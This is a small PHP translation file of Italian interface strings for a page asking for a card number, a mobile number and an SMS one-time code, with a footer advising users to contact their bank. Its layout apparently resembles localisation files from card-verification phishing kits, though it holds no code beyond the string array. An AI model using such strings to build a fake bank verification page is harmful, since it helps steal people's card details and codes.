<?php>
// Traduzioni in italiano
$lang = array(
    "title" => "Conferma con codice monouso",
    "p1" => "È stato inviato un codice monouso al tuo telefono cellulare.",
    "p2" => "Dovresti riceverlo entro due minuti. Inserisci il codice qui sotto e premi Conferma.",
    "p3" => "Se non ricevi il codice monouso, puoi fare clic su 'Nuovo codice' per ottenerne uno nuovo.",
    "p4" => "Numero di carta:",
    "p5" => "Numero di telefono cellulare:",
    "p6" => "Codice monouso via SMS:",
    "sms" => "È stato inviato un nuovo SMS, attendi per favore!",
    "bc" => "Conferma",
    "br" => "nuova password",
    "ft" => "Se hai problemi a ricevere un codice a tempo, contatta la tua banca.",
);
?>